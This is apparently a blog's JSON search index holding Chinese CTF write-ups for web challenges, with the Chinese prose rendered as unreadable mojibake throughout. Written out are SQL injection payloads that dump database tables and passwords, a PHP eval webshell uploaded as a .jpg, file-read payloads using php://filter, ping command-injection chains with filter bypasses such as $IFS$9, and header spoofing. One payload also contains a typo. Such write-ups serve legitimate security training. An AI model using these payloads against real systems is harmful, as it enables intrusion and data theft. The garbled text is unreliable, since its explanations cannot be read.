2019]LoveSQLè¿™å…³ä¹‹å‰æœ‰åšè¿‡ç±»ä¼¼çš„ï¼Œä½†æ˜¯è¿™ä¸ªåº”è¯¥æ˜¯å‡çº§ç‰ˆ è¿›è¿‡å°è¯•å¯çŸ¥æ³¨å…¥ç±»å‹ä¸ºå•å¼•å·æ³¨å…¥ï¼Œç”¨ä¸‡èƒ½å¯†ç å°è¯•ç™»å…¥ å‘ç°è¿™æ¬¡flagä¸åœ¨é‡Œé¢äº†ï¼Œé‚£æˆ‘ä»¬å°è¯•ä¸€ä¸‹è·å–ä»–çš„æ•°æ®åº“ä¿¡æ¯ æ³•1ï¼š unionè”åˆæ³¨å…¥ ç¡®è®¤è¿”å›å­—æ®µæ•°ï¼š1&#39; union select 1,2,3# çˆ†åº“ï¼š1&#39; union select 1,2,database()# çˆ†è¡¨ï¼š1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;geek&#39;# çˆ†åˆ—ï¼š1&#39; union select 1,2,group_cooncat(columns) from information_schema.columns where table_name=&#39;geekuser&#39;# çˆ†å€¼ï¼š1&#39; union select 1,2,group_concat(username,password) from geekuser# å‘ç°è¯¥è¡¨ä¸‹åªæœ‰ä¸€è¡Œæ•°æ®ï¼šid=1,username=admin,password=â€œå­—ç¬¦ä¸²â€ äºæ˜¯æˆ‘ä»¬å†æŸ¥ä¸€ä¸‹l0ve1ysq1è¡¨â€”â€”1&#39; union select 1,2,group_concat(username,password) from l0ve1ysq1# æ³•2ï¼š æŠ¥é”™æ³¨å…¥ï¼š ç”±äºè¾“å…¥1&#39; ä¼šè¿”å›æŠ¥é”™ä¿¡æ¯ï¼Œå°è¯•æŠ¥é”™æ³¨å…¥ï¼š çˆ†åº“ï¼š1&#39; or extractvalue(1,concat(&#39;#&#39;,database()))# çˆ†è¡¨ï¼š1&#39; or extractvalue(1,concat(&#39;#&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;geek&#39;)))# çˆ†åˆ—ï¼š1&#39; or extractvalue(1,concat(&#39;#&#39;,(select group_concat(column_name) from information_schema.columns where table_name=&#39;geekuser&#39;)))# çˆ†å€¼ï¼š1&#39; or extractvalue(1,concat(&#39;#&#39;,(select password from geekuser where id=1)))# å‘ç°è¿”å›ä¸€ä¸²å­—ç¬¦ä¸²ï¼Œä½†æ˜¯flagä¸åœ¨å…¶ä¸­ï¼ŒæŸ¥çœ‹å¦ä¸€ä¸ªè¡¨ 1&#39; or extractvalue(1,concat(&#39;#&#39;,(select password from l0ve1ysq1 where id=1)))# å‘ç°ç”±äºæŠ¥é”™æ³¨å…¥çš„è¿”å›é•¿åº¦çš„é™åˆ¶ï¼Œåç»­çš„å€¼æ²¡æœ‰å…¨éƒ¨å›æ˜¾åœ¨é¡µé¢ä¸Šï¼Œå› æ­¤è¦ç”¨substrå‡½æ•°å»æˆªï¼Œè¿˜æŒºéº»çƒ¦çš„ï¼Œåç»­çš„å°±ä¸å†™äº†ã€‚ [ACTF2020 æ–°ç”Ÿèµ›]BackupFileï¼ˆæ–‡ä»¶å¤‡ä»½+å¼±å£ä»¤ç»•è¿‡ï¼‰æ‰“å¼€å®¹å™¨å‘ç°ä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼ŒæŸ¥çœ‹æºç ä¹Ÿæ²¡æœ‰ï¼Œå¾¡å‰‘æ‰«æä¹Ÿæ²¡æœ‰ï¼Œçœ‹åˆ°é¢˜ç›®æç¤ºå¤‡ä»½æ–‡ä»¶ï¼Œè”æƒ³åˆ°ä¹‹å‰æœ‰åšè¿‡ä»¥.bakä¸ºåç¼€çš„å¤‡ä»½æ–‡ä»¶çš„é¢˜ æ‰“å¼€æ–‡ä»¶å‘ç°ä¸€æ®µæºç  1234567891011121314151617&lt;?phpinclude_once &quot;flag.php&quot;;if(isset($_GET[&#x27;key&#x27;])) &#123; $key = $_GET[&#x27;key&#x27;]; if(!is_numeric($key)) &#123; exit(&quot;Just num!&quot;); &#125; $key = intval($key); $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;; if($key == $str) &#123; echo $flag; &#125;&#125;else &#123; echo &quot;Try to find out source file!&quot;;&#125; ä»£ç å®¡è®¡ï¼šå°†getçš„å€¼èµ‹ç»™å‚æ•°keyï¼Œå…ˆåˆ¤æ–­keyæ˜¯å¦ä¸ºæ•°å­—ï¼Œä¸æ˜¯åˆ™é€€å‡ºï¼Œæ˜¯åˆ™é€šè¿‡intvalè·å–å‚æ•°ä¸­çš„æ•´æ•°éƒ¨åˆ†ï¼Œç„¶åå’Œå˜é‡strçš„å€¼è¿›è¡Œå¯¹æ¯”ï¼Œç›¸ç­‰åˆ™è¾“å‡ºflagã€‚ spï¼š ç”±äºphpå¼±å£ä»¤çš„ç‰¹æ€§ï¼Œå­—ç¬¦ä¸²å’Œæ•°å­—æ¯”è¾ƒä½¿ç”¨==æ—¶,å­—ç¬¦ä¸²ä¼šå…ˆè½¬æ¢ä¸ºæ•°å­—ç±»å‹å†æ¯”è¾ƒ var_dump(â€˜aâ€™ == 0);//true â€”â€”æ­¤æ—¶aå­—ç¬¦ä¸²ç±»å‹è½¬åŒ–æˆæ•°å­—ï¼Œå› ä¸ºaå­—ç¬¦ä¸²å¼€å¤´ä¸­æ²¡æœ‰æ‰¾åˆ°æ•°å­—ï¼Œæ‰€ä»¥è½¬æ¢ä¸º0var_dump(â€˜123aâ€™ == 123);//true â€”â€”è¿™é‡Œâ€™123aâ€™ä¼šè¢«è½¬æ¢ä¸º123 phpä¸­æœ‰è¿™æ ·ä¸€ä¸ªè§„å®šï¼šå­—ç¬¦ä¸²çš„å¼€å§‹éƒ¨åˆ†å†³å®šäº†å®ƒçš„å€¼ï¼Œå¦‚æœè¯¥å­—ç¬¦ä¸²ä»¥åˆæ³•çš„æ•°å­—å¼€å§‹ï¼Œåˆ™ä½¿ç”¨è¯¥æ•°å­—è‡³å’Œå®ƒè¿ç»­çš„æœ€åä¸€ä¸ªæ•°å­—ç»“æŸï¼Œå¦åˆ™å…¶æ¯”è¾ƒæ—¶æ•´ä½“å€¼ä¸º0ã€‚ä¸¾ä¾‹ï¼š var_dump(â€˜a123â€™ == 123);//false var_dump(â€˜1233aâ€™ == 123);//false var_dump(â€˜123a1â€™ == 123);//true å› æ­¤è¿™é‡Œæˆ‘ä»¬åªéœ€è¦æ„é€ payloadï¼š?key=123å³å¯ [æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlagç‚¹å¼€å®¹å™¨ï¼Œè¿›å…¥PAYFLAGé¡µé¢ï¼ŒæŸ¥çœ‹æºç ï¼š æˆ‘ä»¬éœ€è¦ä¸Šä¼ moneyå’Œpasswordï¼Œæ ¹æ®ç½‘é¡µæç¤ºmoney=100000000ï¼Œpassword=404aç»•è¿‡is_numericå’Œphpå¼±å£ä»¤ç›¸ç­‰ æ²¡ä»€ä¹ˆå†…å®¹ï¼ŒæŠ“åŒ…è¯•è¯• ä¿®æ”¹userçš„å€¼ä¸ºstudentï¼Œä½†æ˜¯è¿™æ ·ä¹Ÿä¸è¡Œï¼Œé‚£æ”¹æˆ1ï¼š å¤ªé•¿äº†ï¼Œå°è¯•æ”¹ç”¨ç§‘å­¦è®¡æ•°æ³•","tags":[{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"PHPä¼ªåè®®","date":"2021-04-08T08:27:15.000Z","path":"2021/04/08/PHPä¼ªåè®®/","text":"","tags":[{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"}]},{"title":"bugku2","date":"2021-04-07T14:50:37.000Z","path":"2021/04/07/bugku2/","text":"web25 web26ï¼ˆä¼ªé€ Refererï¼‰ æˆ‘ä»¬çŸ¥é“Refererå¯ä»¥ä¼ªé€ çš„ï¼ŒburpæŠ“åŒ…ï¼Œæ·»åŠ è¯­å¥ï¼šReferer: http://www.google.com è·å¾—flag web27 web28ï¼šï¼ˆä¼ªé€ X-Forwarded-Forï¼‰è¿™é¢˜å°±æ˜¯ä¼ªé€ X-Forwarded-Forä¸å¤šè¯´äº† web29 web30ï¼šï¼ˆçŒœæµ‹ || php:inputåˆ©ç”¨||file_get_contents() å‡½æ•°ç»•è¿‡ï¼‰é¢˜ç›®è¯´txtï¼Œä»€ä¹ˆç”¨å‘¢å…ˆè®°ç€ æ‰“å¼€é¢˜ç›®åœ°å€ï¼Œçœ‹è§æºç  æ–°å‡½æ•°ï¼š extract() å‡½æ•° åŠŸèƒ½ï¼š ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ è¯­æ³•ï¼šextract(array,extract_rules,prefix) å‚æ•° æè¿° array å¿…éœ€ã€‚è§„å®šè¦ä½¿ç”¨çš„æ•°ç»„ã€‚ extract_rules å¯é€‰ã€‚extract() å‡½æ•°å°†æ£€æŸ¥æ¯ä¸ªé”®åæ˜¯å¦ä¸ºåˆæ³•çš„å˜é‡åï¼ŒåŒæ—¶ä¹Ÿæ£€æŸ¥å’Œç¬¦å·è¡¨ä¸­å·²å­˜åœ¨çš„å˜é‡åæ˜¯å¦å†²çªã€‚å¯¹ä¸åˆæ³•å’Œå†²çªçš„é”®åçš„å¤„ç†å°†æ ¹æ®æ­¤å‚æ•°å†³å®šã€‚ å¯èƒ½çš„å€¼ï¼š EXTR_OVERWRITE - é»˜è®¤ã€‚å¦‚æœæœ‰å†²çªï¼Œåˆ™è¦†ç›–å·²æœ‰çš„å˜é‡ã€‚ EXTR_SKIP - å¦‚æœæœ‰å†²çªï¼Œä¸è¦†ç›–å·²æœ‰çš„å˜é‡ã€‚ EXTR_PREFIX_SAME - å¦‚æœæœ‰å†²çªï¼Œåœ¨å˜é‡åå‰åŠ ä¸Šå‰ç¼€ prefixã€‚ EXTR_PREFIX_ALL - ç»™æ‰€æœ‰å˜é‡ååŠ ä¸Šå‰ç¼€ prefixã€‚ EXTR_PREFIX_INVALID - ä»…åœ¨ä¸åˆæ³•æˆ–æ•°å­—å˜é‡åå‰åŠ ä¸Šå‰ç¼€ prefixã€‚ EXTR_IF_EXISTS - ä»…åœ¨å½“å‰ç¬¦å·è¡¨ä¸­å·²æœ‰åŒåå˜é‡æ—¶ï¼Œè¦†ç›–å®ƒä»¬çš„å€¼ã€‚å…¶å®ƒçš„éƒ½ä¸å¤„ç†ã€‚ EXTR_PREFIX_IF_EXISTS - ä»…åœ¨å½“å‰ç¬¦å·è¡¨ä¸­å·²æœ‰åŒåå˜é‡æ—¶ï¼Œå»ºç«‹é™„åŠ äº†å‰ç¼€çš„å˜é‡åï¼Œå…¶å®ƒçš„éƒ½ä¸å¤„ç†ã€‚ EXTR_REFS - å°†å˜é‡ä½œä¸ºå¼•ç”¨æå–ã€‚å¯¼å…¥çš„å˜é‡ä»ç„¶å¼•ç”¨äº†æ•°ç»„å‚æ•°çš„å€¼ã€‚ prefix å¯é€‰ã€‚è¯·æ³¨æ„ prefix ä»…åœ¨ extract_type çš„å€¼æ˜¯ EXTR_PREFIX_SAMEï¼ŒEXTR_PREFIX_ALLï¼ŒEXTR_PREFIX_INVALID æˆ– EXTR_PREFIX_IF_EXISTS æ—¶éœ€è¦ã€‚å¦‚æœé™„åŠ äº†å‰ç¼€åçš„ç»“æœä¸æ˜¯åˆæ³•çš„å˜é‡åï¼Œå°†ä¸ä¼šå¯¼å…¥åˆ°ç¬¦å·è¡¨ä¸­ã€‚ å‰ç¼€å’Œæ•°ç»„é”®åä¹‹é—´ä¼šè‡ªåŠ¨åŠ ä¸Šä¸€ä¸ªä¸‹åˆ’çº¿ã€‚ file_get_contents() å‡½æ•° åŠŸèƒ½ï¼šæŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ è¯­æ³•ï¼šfile_get_contents(path,include_path,context,start,max_length) å‚æ•° æè¿° path å¿…éœ€ã€‚è§„å®šè¦è¯»å–çš„æ–‡ä»¶ã€‚ include_path å¯é€‰ã€‚å¦‚æœæ‚¨è¿˜æƒ³åœ¨ include_pathï¼ˆåœ¨ php.ini ä¸­ï¼‰ä¸­æœç´¢æ–‡ä»¶çš„è¯ï¼Œè¯·è®¾ç½®è¯¥å‚æ•°ä¸º â€˜1â€™ã€‚ context å¯é€‰ã€‚è§„å®šæ–‡ä»¶å¥æŸ„çš„ç¯å¢ƒã€‚context æ˜¯ä¸€å¥—å¯ä»¥ä¿®æ”¹æµçš„è¡Œä¸ºçš„é€‰é¡¹ã€‚è‹¥ä½¿ç”¨ NULLï¼Œåˆ™å¿½ç•¥ã€‚ start å¯é€‰ã€‚è§„å®šåœ¨æ–‡ä»¶ä¸­å¼€å§‹è¯»å–çš„ä½ç½®ã€‚è¯¥å‚æ•°æ˜¯ PHP 5.1 ä¸­æ–°å¢çš„ã€‚ max_length å¯é€‰ã€‚è§„å®šè¯»å–çš„å­—èŠ‚æ•°ã€‚è¯¥å‚æ•°æ˜¯ PHP 5.1 ä¸­æ–°å¢çš„ã€‚ ä»£ç å®¡è®¡ï¼šé€šè¿‡getçš„æ–¹å¼è·å–$acå’Œ$fnï¼Œfile_get_contents() å‡½æ•°è¯»å–æ–‡ä»¶å†…å®¹ï¼Œç„¶åèµ‹å€¼ç»™$fï¼Œå½“$f=$acæ—¶è¾“å‡ºflag æ³•1ï¼šç”±äºé¢˜ç›®æåˆ°ä¸€ä¸ªåç¼€txtï¼ŒçŒœæµ‹å­˜åœ¨æ–‡ä»¶åflag.txtï¼Œè®¿é—®ï¼Œæœç„¶å­˜åœ¨ æ„é€ payloadï¼š?ac=bugku&amp;fn=flag.txt æ³•2ï¼šåˆ©ç”¨phpä¼ªåè®®php://input å½“ä¼ å…¥çš„å‚æ•°å€¼ä½œä¸ºæ–‡ä»¶åæ‰“å¼€æ—¶ï¼Œå¯ä»¥å°†å‚æ•°å€¼è®¾ä¸ºphp://input,åŒæ—¶postæƒ³è®¾ç½®çš„æ–‡ä»¶å†…å®¹ï¼Œphpæ‰§è¡Œæ—¶ä¼šå°†postå†…å®¹å½“ä½œæ–‡ä»¶å†…å®¹ã€‚ web31ï¼šï¼ˆå¾¡å‰‘æ‰«æ+burpæš´åŠ›ç ´è§£ï¼‰åˆšæ‰“å¼€é¢˜ç›®åœ°å€è¿˜ä»¥ä¸ºç½‘ç»œå´©äº†ï¼Œåˆ·äº†å‡ æ¬¡è¿˜æ˜¯ä¸€æ ·ï¼Œé‚£åº”è¯¥å°±æ˜¯é¢˜ç›®é¡µé¢äº†ï¼ŒæŸ¥çœ‹ä¸€ä¸‹æºç ï¼Œæ²¡ä¸œè¥¿ï¼Œèšå‰‘æ‰«ä¸€ä¸‹ å‘ç°æœ‰ä¸€ä¸ªrobots.txtï¼Œç‚¹è¿›å»çœ‹ä¸€ä¸‹ æ‰“å¼€resusl.php å‘ç°è¿™é‡Œé€šè¿‡GETæ–¹å¼è·å–å‚æ•°xï¼Œå½“xçš„å€¼ç­‰passwordæ—¶åº”è¯¥å°±ä¼šè·³å‡ºflagäº†ï¼Œå°è¯•çˆ†ç ´ web32ç¥ä»™é¢˜ï¼Œæ²¡çœ‹æºç åšä¸ªé¬¼ web34ï¼šï¼ˆupload+ä¸€å¥è¯æœ¨é©¬ï¼‰æ‰“å¼€é¢˜ç›®åœ°å€ï¼Œé¡µé¢ä¸Šæ²¡ä»€ä¹ˆä¸œè¥¿ï¼ŒæŸ¥çœ‹æºç ï¼š ç‚¹å¼€upload.php å°è¯•ä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åå‘ç°å®ƒè®¾ç«‹äº†ä¸€ä¸ªç™½åå•ï¼Œçœ‹èµ·æ¥ä¸å¥½ç»•äº† ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œè®¿é—®ä¸Šä¼ åœ°å€ï¼š æˆ‘ä»¬çœ‹åˆ°çœ‹æ¥æœåŠ¡å™¨è¿‡æ»¤äº†&lt;?phpå’Œ?&gt; æ³•1ï¼šæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶ï¼Œåç¼€jpgï¼Œå†…å®¹&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;cmd&#39;]); &lt;/script&gt;ä¸Šä¼ ï¼Œè®¿é—®å‘ç°ä¸€ç‰‡ç©ºç™½ï¼Œè¯´æ˜è¢«å½“åšphpä»£ç æ‰§è¡Œäº†ï¼Œèšå‰‘è¿æ¥ï¼Œç»ˆç«¯å¯»æ‰¾ æ³•2ï¼šæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶ï¼Œåç¼€jpgï¼Œå†…å®¹&lt;script language=&quot;php&quot;&gt;system(&quot;find / -name flag*&quot;); &lt;/script&gt; è®¿é—®ä¸Šä¼ åœ°å€ ç›´æ¥?flie=/flag ï¼Œ flagå°±å‡ºæ¥äº† ç„¶åæˆ‘è‡ªå·±ä¿®æ”¹äº†ä¸€ä¸‹æ–‡ä»¶å†…å®¹ï¼š&lt;script language=&quot;php&quot;&gt;system(&quot;cat /flag&quot;); &lt;/script&gt; è®¿é—®ä¸Šä¼ åœ°å€ web35ï¼šï¼ˆååºåˆ—åŒ–ï¼‰ç‚¹å¼€é¢˜ç›®åœ°å€ ç¬¬ä¸€çœ¼çœ‹è¿˜ä»¥ä¸ºæ˜¯ä¸€é“sqlæ³¨å…¥é¢˜ï¼Œç»“æœå‘ç°loginç‚¹ä¸åŠ¨ã€‚æŸ¥çœ‹æºç  ç‚¹å‡» å°è¯•ä¼ è¾“ï¼š?25603 æˆ‘ä»¬çœ‹åˆ°å½“cookieçš„å€¼ååºåˆ—åŒ–åç­‰äºkeyçš„å€¼æ—¶ä¼šè¾“å‡ºflagï¼Œäºæ˜¯æˆ‘ä»¬è‡ªç„¶æƒ³åˆ°å°†keyçš„å€¼å…ˆåºåˆ—åŒ–åèµ‹å€¼ç»™cookie phpåœ¨çº¿å·¥å…·ï¼šhttps://c.runoob.com/compile/1 æ„é€ payload:Cookie: BUGKU=s:13:&quot;ctf.bugku.com&quot;","tags":[{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"buuctf","date":"2021-04-05T12:29:14.000Z","path":"2021/04/05/buuctf1/","text":"[ACTF2020 æ–°ç”Ÿèµ›]Includeç‚¹å¼€å®¹å™¨ï¼Œå‘ç° ç‚¹å‡»tips å‘ç°æ˜¯ç”¨æ–‡ä»¶åŒ…å«çš„æ–¹å¼æ‰“å¼€flag.phpæ–‡ä»¶ ä¹‹å‰åˆ·é¢˜æœ‰åšè¿‡ç”¨php://filterè¯»å–æ–‡ä»¶æºç ï¼Œè¿™é¢˜è¯•ä¸€ä¸‹ ç”¨base64-decode 12345678910111213&lt;meta charset=&quot;utf8&quot;&gt;&lt;?phperror_reporting(0);$file = $_GET[&quot;file&quot;];if(stristr($file,&quot;php://input&quot;) || stristr($file,&quot;zip://&quot;) || stristr($file,&quot;phar://&quot;) || stristr($file,&quot;data:&quot;))&#123; exit(&#x27;hacker!&#x27;);&#125;if($file)&#123; include($file);&#125;else&#123; echo &#x27;&lt;a href=&quot;?file=flag.php&quot;&gt;tips&lt;/a&gt;&#x27;;&#125;?&gt; index.phpé‡Œæ²¡å†…å®¹ï¼Œçœ‹ä¸€ä¸‹flag.phpé‡Œçš„ ç”¨base64-decode 1234&lt;?phpecho &quot;Can you find out the flag?&quot;;//flag&#123;ce69e052-72a5-4f31-b4f7-d618aa394082&#125;?&gt; [æå®¢å¤§æŒ‘æˆ˜ 2019]Secret Fileç‚¹å¼€å®¹å™¨ï¼Œå‘ç°ä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼Œç”¨å¾¡å‰‘è·‘äº†ä¸€ä¸‹ï¼Œå‘ç°å®¹æ˜“æœåŠ¡å™¨å´©ï¼Œçº¿ç¨‹å°‘åˆè·‘çš„æ…¢ï¼Œç‚¹å‡»æŸ¥çœ‹æºç  ç‚¹å¼€ç®­å¤´æ‰€æŒ‡é“¾æ¥ ç‚¹å¼€ç®­å¤´æ‰€æŒ‡é“¾æ¥ï¼Œå‘ç°ä¼š302è·³è½¬åˆ°end.phpè¯´æ˜è¿™é‡Œé¢æœ‰çŒ«è…» burpæŠ“åŒ…ï¼Œå‘é€åˆ°Repeater è®¿é—®secr3t.phpï¼Œå¾—ä¸€æ®µä»£ç ï¼š 123456789101112131415&lt;html&gt; &lt;title&gt;secret&lt;/title&gt; &lt;meta charset=&quot;UTF-8&quot;&gt;&lt;?php highlight_file(__FILE__); error_reporting(0); $file=$_GET[&#x27;file&#x27;]; if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123; echo &quot;Oh no!&quot;; exit(); &#125; include($file); //flagæ”¾åœ¨äº†flag.phpé‡Œ?&gt;&lt;/html&gt; è¿™é‡Œè¿›è¡Œä¸‹ä¸€æ­¥çš„æ—¶å€™æˆ‘æ”¾äº†ä¸€ä¸ªé”™è¯¯ï¼Œæˆ‘çŸ¥é“è¦ç”¨php://filterè¯»å–flagæ–‡ä»¶ï¼Œä½†æ˜¯é”™è¯¯çš„åœ¨index.phpåä¼ å‚çš„ï¼Œ ä¹Ÿå°±æ˜¯ï¼šhttp://c76e7818-4c78-4212-841b-f65037874e73.node3.buuoj.cn/?file=php://filter/convert.base64-encode/resource=flag.php è¿™æ ·æ˜¯é”™è¯¯çš„ï¼Œå› ä¸ºindex.phpæ²¡æœ‰æ–‡ä»¶åŒ…å«ï¼Œ å› æ­¤æˆ‘ä»¬è¦æ”¹æˆï¼šhttp://c76e7818-4c78-4212-841b-f65037874e73.node3.buuoj.cn/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php å¯¹ç®­å·æ‰€æŒ‡çš„å­—ç¬¦ä¸²base64è§£ç ï¼š 12345678910111213141516171819&lt;html&gt;&lt;head&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; &lt;title&gt;FLAG&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body style&#x3D;&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;h1 style&#x3D;&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;Ã¥Â•ÂŠÃ¥Â“ÂˆÃ¯Â¼ÂÃ¤Â½ Ã¦Â‰Â¾Ã¥ÂˆÂ°Ã¦ÂˆÂ‘Ã¤ÂºÂ†Ã¯Â¼ÂÃ¥ÂÂ¯Ã¦Â˜Â¯Ã¤Â½ Ã§ÂœÂ‹Ã¤Â¸ÂÃ¥ÂˆÂ°Ã¦ÂˆÂ‘QAQ~~~&lt;&#x2F;h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;p style&#x3D;&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt; &lt;?php echo &quot;Ã¦ÂˆÂ‘Ã¥Â°Â±Ã¥ÂœÂ¨Ã¨Â¿Â™Ã©Â‡ÂŒ&quot;; $flag &#x3D; &#39;flag&#123;c2a2c0e2-6076-4c2a-a387-f45b291c0978&#125;&#39;; $secret &#x3D; &#39;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#39; ?&gt; &lt;&#x2F;p&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; å¾—flag [ACTF2020 æ–°ç”Ÿèµ›]Execç‚¹å¼€å®¹å™¨ï¼Œå‘ç°ä¸€ä¸ªpingçª—å£ pingä¸€ä¸‹å®¹å™¨åœ°å€ å›é¡¾ä¸€ä¸‹ç³»ç»Ÿå‘½ä»¤çš„ç®¡é“ç¬¦ 1ã€|ï¼ˆå°±æ˜¯æŒ‰ä½æˆ–ï¼‰ï¼Œç›´æ¥æ‰§è¡Œ|åé¢çš„è¯­å¥ 2ã€||ï¼ˆå°±æ˜¯é€»è¾‘æˆ–ï¼‰ï¼Œå¦‚æœå‰é¢å‘½ä»¤æ˜¯é”™çš„é‚£ä¹ˆå°±æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå¦åˆ™åªæ‰§è¡Œå‰é¢çš„è¯­å¥ 3ã€&amp;ï¼ˆå°±æ˜¯æŒ‰ä½ä¸ï¼‰ï¼Œ&amp;å‰é¢å’Œåé¢å‘½ä»¤éƒ½è¦æ‰§è¡Œï¼Œæ— è®ºå‰é¢çœŸå‡ 4ã€&amp;&amp;ï¼ˆå°±æ˜¯é€»è¾‘ä¸ï¼‰ï¼Œå¦‚æœå‰é¢ä¸ºå‡ï¼Œåé¢çš„å‘½ä»¤ä¹Ÿä¸æ‰§è¡Œï¼Œå¦‚æœå‰é¢ä¸ºçœŸåˆ™æ‰§è¡Œä¸¤æ¡å‘½ä»¤ 5ã€; å‰åéƒ½æ‰§è¡Œï¼Œæ— è®ºå‰é¢çœŸå‡ï¼ŒåŒ&amp;ï¼Œï¼ˆlinuxä¹Ÿæœ‰ï¼‰ ping: f91eb079-6b2c-4052-8575-0021fe980c34.node3.buuoj.cn |lsâ€”â€”æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ çœ‹æ¥flagä¸åœ¨å½“å‰ç›®å½•ä¸‹ ping: f91eb079-6b2c-4052-8575-0021fe980c34.node3.buuoj.cn |ls /â€”â€”æŸ¥çœ‹æ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶ æˆ‘ä»¬çœ‹åˆ°åœ¨æ ¹ç›®å½•ä¸‹å­˜åœ¨ä¸€ä¸ªåä¸ºflagçš„æ–‡ä»¶ pingï¼šf91eb079-6b2c-4052-8575-0021fe980c34.node3.buuoj.cn | cat /flag å¾—flag [GXYCTF2019]Ping Ping Pingç‚¹å¼€å®¹å™¨ ç›´æ¥å¼€å§‹ping å‘ç°ä¸èƒ½payloadé‡Œé¢ä¸èƒ½æœ‰ç©ºæ ¼ è¡¥å……ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼ˆå‘½ä»¤æ‰§è¡Œç©ºæ ¼ç»•è¿‡ï¼‰ï¼š &lt; &lt;&gt; &gt; é‡å®šå‘ç¬¦ %09(éœ€è¦phpç¯å¢ƒ) $&#123;IFS&#125; $IFS$9 &#123;cat,flag.php&#125; //ç”¨é€—å·å®ç°äº†ç©ºæ ¼åŠŸèƒ½ %20 é‚£ä¹ˆæˆ‘ä»¬å°è¯•ç”¨é‡å®šå‘ç¬¦ç»•è¿‡ å‘ç°éƒ¨åˆ†ç¬¦å·ä¹Ÿè¢«ç¦ç”¨äº†ï¼Œ é‚£ä¹ˆæˆ‘ä»¬å°è¯•ç”¨$IFS$9ç»•è¿‡ï¼Œç»•è¿‡æˆåŠŸï¼Œå°è¯•cat flag å‘ç°flagéƒ½è¢«ç¦äº†ï¼Œé‚£æˆ‘ä»¬cat index.phpï¼Œå¾—ä¸€æ®µä»£ç ï¼š 12345678910111213141516171819&lt;?phpif(isset($_GET[&#x27;ip&#x27;]))&#123; $ip = $_GET[&#x27;ip&#x27;]; if(preg_match(&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;1f&#125;]|\\&gt;|\\&#x27;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;, $ip, $match))&#123; echo preg_match(&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;20&#125;]|\\&gt;|\\&#x27;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;, $ip, $match); die(&quot;fxck your symbol!&quot;); &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123; die(&quot;fxck your space!&quot;); &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123; die(&quot;fxck your bash!&quot;); &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123; die(&quot;fxck your flag!&quot;); &#125; $a = shell_exec(&quot;ping -c 4 &quot;.$ip); echo &quot;&lt;pre&gt;&quot;; print_r($a);&#125;?&gt; æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å®ƒç¦ç”¨äº†å¾ˆå¤šçš„ç¬¦å·ï¼Œè¿™è¾¹è¦æ³¨æ„å®ƒä¸¥æ ¼è¿‡æ»¤äº†flagâ€”â€”åªè¦å­—ç¬¦ä¸²ä¸­æœ‰æŒ‰é¡ºåºå­˜åœ¨f l a gå°±ä¼šè¢«è­¦å‘Š æ³•1ï¼šç”±äºå­˜åœ¨shell_execï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•è®¾å‚ï¼Œå¦‚æ„é€ payloadï¼š?ip=127.0.0.1;m=ag;n=fl;cat$IFS$9$n$m.php è¿™å¥è¯å…¶å®åœ¨ç»ˆç«¯å°±æ‰§è¡Œäº†ä¸¤å¥è¯ï¼Œä¸€ä¸ªæ˜¯pingç«¯å£127.0.0.1ï¼Œå¦ä¸€ä¸ªæ˜¯æ‰§è¡Œcat flag.phpæ–‡ä»¶ã€‚ä¸­é—´ä¸¤å¥æ˜¯è®¾ç½®å˜é‡èµ‹å€¼ã€‚ æ³•2ï¼šå†…è”æ‰§è¡Œ åå¼•å·åœ¨linuxä¸­ä½œä¸ºå†…è”æ‰§è¡Œï¼Œæ‰§è¡Œè¾“å‡ºç»“æœã€‚ä¹Ÿå°±æ˜¯è¯´ cat ```ls` ``â€”â€”å…ˆæ‰§è¡Œlsï¼Œè¾“å‡º index.php å’Œ flag.php ã€‚ç„¶åå†æ‰§è¡Œ cat index.php;cat flag.php è¿™æ 